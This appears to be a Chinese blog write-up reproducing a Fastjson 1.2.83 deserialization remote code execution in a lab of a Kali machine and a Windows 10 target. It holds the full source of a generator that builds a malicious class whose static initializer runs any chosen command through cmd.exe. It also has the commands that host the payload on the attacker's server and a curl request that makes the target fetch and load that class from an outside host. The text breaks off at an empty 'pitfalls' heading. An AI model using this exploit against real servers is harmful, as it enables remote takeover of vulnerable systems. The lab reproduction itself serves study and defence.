---
title: FastJson1.2.83复现
date: 2026-09-24 00:36:38
categories:
  - WebSecurity
  - CVE
  - FastJson
tags:
  - FastJson
  - 反序列化
  - RCE
  - 中间件
  - 漏洞复现
---

## 一、漏洞简介

参考：https://www.cnblogs.com/9eek/p/21793398

## 二、实验环境

| 角色  | 系统             | IP 地址         |
| --- | -------------- | ------------- |
| VPS | Kali Linux 虚拟机 | 192.168.0.100 |
| 靶机  | Windows 10     | 192.168.0.115 |

网络要求：
- 两台机器处于同一局域网；
- 使用 **桥接模式** 连接，使虚拟机与宿主机处于同一网段。


## 三、漏洞成因




参考：https://www.cnblogs.com/9eek/p/21793398

## 四、漏洞复现：
### 1、环境部署
这里直接用开源好的工具即可
靶场：https://github.com/charis3306/Fastjson1.2.83-vul
poc：https://github.com/0x7eTeam/fastjson-1.2.83-rce
#### 1.1、JDK8RCE靶场环境部署
a、由于漏洞成型的特殊要求，需要满足：目标为fastjson1.2.83+SpringBoot项目+FartJar打包
靶场漏洞代码可参考：
https://github.com/charis3306/Fastjson1.2.83-vul
b、进行jar打包（不可用ide直接跑，漏洞需要打包成jar，这样去加载远程类的时候才会用LauncherLoadClassLoader）
这里直接用它这个rce-env，在项目目录下进行打包
mvn clean package -DskipTests（maven环境没有的话可以自己去搜下怎么安装）
![](images/Pasted%20image%2020260924000012.png)
c、启动靶场，一般默认8080，有需要可以去application.yml自己配置
java -jar  E:\Fastjson1.2.83-vul-main\target\fastjson-login-rce-1.0.0.jar
![](images/Pasted%20image%2020260924000200.png)


#### 1.2、POC环境部署
git 拉去poc项目
git clon https://github.com/0x7eTeam/fastjson-1.2.83-rce.git
这里简单介绍下：
lib目录下是我们需要生成poc所需要的依赖，包括ams和fastjson的jar包
![](images/Pasted%20image%2020260923231925.png)
GenProbe.jar主要是用于生成poc，直接做成文件更方便生成payload
![](images/Pasted%20image%2020260923231937.png)
www目录主要用于将最终的poc放置并开启临时服务器，用于靶场进行远程访问
### 2、复现
#### a、编译GenProbe.java文件
![](images/Pasted%20image%2020260923232436.png)
```shell
javac -cp "poc/lib/*" -d poc poc/GenProbe.java

javac：Java 编译命令（把 `.java` 源码 → `.class` 字节码）
-cp：**类路径**，告诉编译器去哪里找依赖 jar 包
"poc/lib/*"：`poc/lib/` 目录下所有 jar 包，编译时需要这些库（asm、fastjson 等）
-d poc：指定编译后的 class 文件输出目录为 poc/**
poc/GenProbe.java：要编译的 Java 源代码文件

```

#### b、生成预期的poc
这里我们将poc放到vps的19090端口服务上，所以传递给GenProbe的参数，应该为vps开启服务的ip、端口
靶机是windows，命令为calc.exe
生成的payload，这里由于他的检查机制
	1、//全部为..,因为xxx函数会将其转换
	2、由于转换，所以将ip地址转成32位的整数
这个payload就是让为了让存在漏洞的地方，传递的json如下，去访问vps上的19090端口的服务上的probe类的poc方法（or类）
![](images/Pasted%20image%2020260923233040.png)
```shell
java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" GenProbe 192.168.0.100 19090 "calc.exe"

-cp：运行时类路径（和 javac 的 cp 不是同一个，**运行时也要加载依赖 jar**）
    - Linux/Mac 类路径分隔符是**冒号 `:`**；Windows 是分号 `;`
    - `poc`：从 poc 目录找我们编译出来的 GenProbe.class
    - `poc/lib/asm-9.6.jar`、`poc/lib/fastjson-1.2.83.jar`：运行依赖包
-GenProbe：要运行的主类名
- 后面三个是**传给程序 main 方法的参数**：
    1. `127.0.0.1` → IP
    2. `19090` → 端口
    3. `"open -a Calculator"` → 要执行的系统命令（macOS 打开计算器；Linux 是`calc`，Windows 是`calc.exe`
```
#### c、启动服务
```
cd poc/www && python3 -m http.server 19090
```
![](images/Pasted%20image%2020260923234416.png)

#### d、验证
	1、可以通过vps上的poc里面的exp.py文件进行，比较方便
	`python3 poc/exp.py -u 靶机服务漏洞端口地址 -poc http://192.168.0.100:19090/probe（vps的服务地址）'
	2、靶机上抓包，篡改
![](images/Pasted%20image%2020260924002913.png)
	3、curl
```
curl -X POST -u http://192.168.0.115:8080/parse -H "Content-Type: application/json" -d '{"@type":"jar:http:..3232235620:19090.probe!.POC","x":1}' 
```
这里这个靶场的漏洞点是/api/login接口
![](images/Pasted%20image%2020260924002913.png)
![](images/Pasted%20image%2020260924002024.png)
所以：
会报错500，vps这边也有记录，但是就是不执行，没有弹计算器哈，这里是因为genprobe脚本有点问题，下面踩坑也会写
先改成强制windows下弹计算器的poc
```java
import org.objectweb.asm.*;
import java.io.*;
import java.nio.file.*;
import java.util.jar.*;
/**
 * 生成恶意 probe.jar
 * VPS(Linux)运行，生成给Windows靶机使用的POC
 */
public class GenProbe {
    public static void main(String[] args) throws Exception {
        String lhost = args.length > 0 ? args[0] : "127.0.0.1";
        String lport = args.length > 1 ? args[1] : "19090";
        String cmd = args.length > 2 ? args[2] : "calc";

        // ========== 强制写死Windows，忽略当前运行操作系统（VPS是Linux也没关系）==========
        boolean win = true;
        // 用绝对路径C:\Windows\System32\cmd.exe 解决PATH缺失导致CreateProcess error=2
        String shell = "C:\\Windows\\System32\\cmd.exe";
        String shellFlag = "/c";
        // =================================================================================

        // IP 转整数
        String[] parts = lhost.split("\\.");
        long ipInt = (Long.parseLong(parts[0]) << 24) | (Long.parseLong(parts[1]) << 16)
                | (Long.parseLong(parts[2]) << 8) | Long.parseLong(parts[3]);
        String internalName = "jar:http://" + ipInt + ":" + lport + "/probe!/POC";
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internalName, null, "java/lang/Object", null);
        // @JSONType 注解 — 触发 Fastjson 信任路径
        cw.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true).visitEnd();
        // 构造函数
        MethodVisitor init = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        init.visitCode();
        init.visitVarInsn(Opcodes.ALOAD, 0);
        init.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        init.visitInsn(Opcodes.RETURN);
        init.visitMaxs(1, 1);
        init.visitEnd();
        // static {} — 执行命令
        MethodVisitor clinit = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        clinit.visitCode();
        clinit.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
        clinit.visitInsn(Opcodes.ICONST_3);
        clinit.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
        clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_0);
        clinit.visitLdcInsn(shell); clinit.visitInsn(Opcodes.AASTORE);
        clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_1);
        clinit.visitLdcInsn(shellFlag); clinit.visitInsn(Opcodes.AASTORE);
        clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_2);
        clinit.visitLdcInsn(cmd); clinit.visitInsn(Opcodes.AASTORE);
        clinit.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
        clinit.visitInsn(Opcodes.POP);
        clinit.visitInsn(Opcodes.RETURN);
        clinit.visitMaxs(5, 0);
        clinit.visitEnd();
        cw.visitEnd();
        // 打包
        Files.createDirectories(Paths.get("poc/www"));
        Path jarPath = Paths.get("poc/probe.jar");
        try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(jarPath.toFile()))) {
            jos.putNextEntry(new JarEntry("POC.class"));
            jos.write(cw.toByteArray());
            jos.closeEntry();
        }
        Files.copy(jarPath, Paths.get("poc/www/probe"), StandardCopyOption.REPLACE_EXISTING);
        System.out.println("[+] command  : " + shell + " " + shellFlag + " " + cmd);
        System.out.println("[+] poc/probe.jar & poc/www/probe generated");
        System.out.println("[+] Payload: {\"@type\":\"jar:http:.." + ipInt + ":" + lport + ".probe!.POC\",\"x\":1}");
    }
}
```

改完之后，靶场环境也需要重启，不然还是不弹窗
![](images/Pasted%20image%2020260924002623.png)
ok，windows弹窗计算器了
![](images/Pasted%20image%2020260924002803.png)

### 3、踩坑

漏洞代码审计